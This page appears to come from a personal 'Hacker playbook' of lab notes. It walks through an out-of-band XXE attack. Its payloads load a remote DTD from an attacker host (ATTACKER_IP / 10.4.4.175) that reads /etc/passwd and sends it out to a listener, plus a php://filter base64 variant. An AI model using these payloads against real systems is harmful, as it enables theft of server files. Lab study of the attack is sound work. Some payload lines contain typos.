<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Advanced XXE OOB</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="Hacker-playbook--Webapps-attack.html">Webapps-attack</a></p>

<ol>
<li><a href="Hacker-playbook--Webapps-attack--recon-tools.html">recon-tools</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS.html">XSS</a></li>
<ol>
<li><a href="Hacker-playbook--Webapps-attack--XSS--classic_XSS.html">classic XSS</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--HTML_entity_attacks_XSS.html">HTML entity attacks XSS</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Polyglot_Attack.html">Polyglot Attack</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--xsshunter.html">xsshunter</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--DOM_XSS.html">DOM XSS</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Adv_NodeJS_XSS.html">Adv NodeJS XSS</a></li>
<ol>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Adv_NodeJS_XSS--escaped_string_interpolation.html">escaped string interpolation</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Adv_NodeJS_XSS--unescaped_string_interpolation.html">unescaped string interpolation</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Adv_NodeJS_XSS--Escaped_String_Interpolation_into_dynamic_inline_Javascript.html">Escaped String Interpolation into dynamic inline Javascript</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Adv_NodeJS_XSS--Unescaped_buffered_code.html">Unescaped buffered code</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Adv_NodeJS_XSS--Escaped_String_Interpolation_into_escaped_dynamic_inline_Javascript.html">Escaped String Interpolation into escaped dynamic inline Javascript</a></li>
</ol>
</ol>
<li><a href="Hacker-playbook--Webapps-attack--BeeF.html">BeeF</a></li>
<li><a href="Hacker-playbook--Webapps-attack--NoSQL_injection.html">NoSQL injection</a></li>
<ol>
<li><a href="Hacker-playbook--Webapps-attack--NoSQL_injection--classic_login_injection.html">classic login injection</a></li>
<li><a href="Hacker-playbook--Webapps-attack--NoSQL_injection--Advanced_NOSQL_injection.html">Advanced NOSQL injection</a></li>
<ol>
<li><a href="Hacker-playbook--Webapps-attack--NoSQL_injection--Advanced_NOSQL_injection--password_injection.html">password injection</a></li>
<li><a href="Hacker-playbook--Webapps-attack--NoSQL_injection--Advanced_NOSQL_injection--get_users_and_passwords.html">get users and passwords</a></li>
</ol>
</ol>
<li><a href="Hacker-playbook--Webapps-attack--Deserialization.html">Deserialization</a></li>
<li><a href="Hacker-playbook--Webapps-attack--Template_Engine_Attacks.html">Template Engine Attacks</a></li>
<li><a href="Hacker-playbook--Webapps-attack--Tplmap.html">Tplmap</a></li>
<li><a href="Hacker-playbook--Webapps-attack--Template-RCE-upload.html">Template-RCE-upload</a></li>
<li><a href="Hacker-playbook--Webapps-attack--Server_Side_Request_Forgery.html">Server Side Request Forgery</a></li>
<ol>
<li><a href="Hacker-playbook--Webapps-attack--Server_Side_Request_Forgery--chat.html">chat</a></li>
</ol>
<li><a href="Hacker-playbook--Webapps-attack--XML-XXE.html">XML-XXE</a></li>
<ol>
<li><a href="Hacker-playbook--Webapps-attack--XML-XXE--lab.html">lab</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XML-XXE--Advanced_XXE_OOB.html">Advanced XXE OOB</a></li>
</ol></ol></div>
<div class="page"><h1><b><u>Advanced XXE OOB</u></b></h1><br /><strong><h2>Advanced XML External entities Out of Band (OOB)</h2></strong><br /><br />Payloads (bypass WAF and so on):<br /><br /><a href="https://gist.github.com/staaldraad/01415b990939494879b4">https://gist.github.com/staaldraad/01415b990939494879b4</a><br /><a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt">https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt</a><br /><br /><br /><br />In case we are not able to get a response in the specific tag (char filtering/restriction) we can use a remote <strong>Document Type Definition</strong><br /><br /><strong>DTD</strong><br /><br />DTD is a well structured XML file that definies the structure and the legal element and attributes of a XML file.<br /><strong><span style="text-decoration:underline;"><br />4 stages attacks :</span></strong><br /><br />• Modified XXE XML attack<br />• Force the Vulnerable XML parser to grab Document Type Definition on our remote attacking machine.<br />• DTD file contains code to read /etc/passwd<br />• DTD file contains code to exfil the contents of the data out (on our attacking machine)<br /><br /><br />1)  Modified XXE attack :<br /><br />&lt;!ENTITY %dtd SYSTEM “http://ATTACKER_IP:80/payload.dtd” %dtd;<br /><br />data=&lt;?xml version="1.0" ?&gt;&lt;!DOCTYPE thp [ &lt;!ELEMENT thp ANY&gt;&lt;!ENTITY % dtd SYSTEM "<a href="http://10.4.4.175/payload.dtd">">http://10.4.4.175/payload.dtd"&gt;</a> %dtd;]&lt;thp&gt;&lt;error&gt; %26send%3b&lt;/error&gt;&lt;/thp&gt;<br /><br /><img src="images/697-1.png" alt="images/697-1.png" /><br /><br />2) Create the payload.dtd on the attacking machine :<br /><br /><img src="images/697-2.png" alt="images/697-2.png" /><br /><br />root@thp3:~/Documents/thp3/exercices/xxe-oob# cat payload.dtd <br />&lt;!ENTITIY % file SYSTEM "file:///etc/passwd"&gt;<br />&lt;!ENTITIY % all "&lt;!ENTITY send SYSTEM '<a href="http://10.4.4.175:8888/collect=%file;'>">">http://10.4.4.175:8888/collect=%file;'&gt;"&gt;</a><br />%all;<br /><br /><br />3) host the file and set up a listener on the attacker machine :<br /><br /><img src="images/697-3.png" alt="images/697-3.png" /><br /><br /><img src="images/697-4.png" alt="images/697-4.png" /><br /><br /><br />4) Getting in parser error and no output :<br /><br /><img src="images/697-5.png" alt="images/697-5.png" /><br /><br />So php wrappers !<br /><br />5) Modify the payload.dtd to encode the output :<br /><br /><br />php://filter/read=convert.base64-encode/resource=file:///etc/passwd<br /><br /><img src="images/697-6.png" alt="images/697-6.png" /><br /><br /><br /><img src="images/697-7.png" alt="images/697-7.png" /><br /><br /><br /><img src="images/697-8.png" alt="images/697-8.png" /><br /><br /></div></div>
</body></html>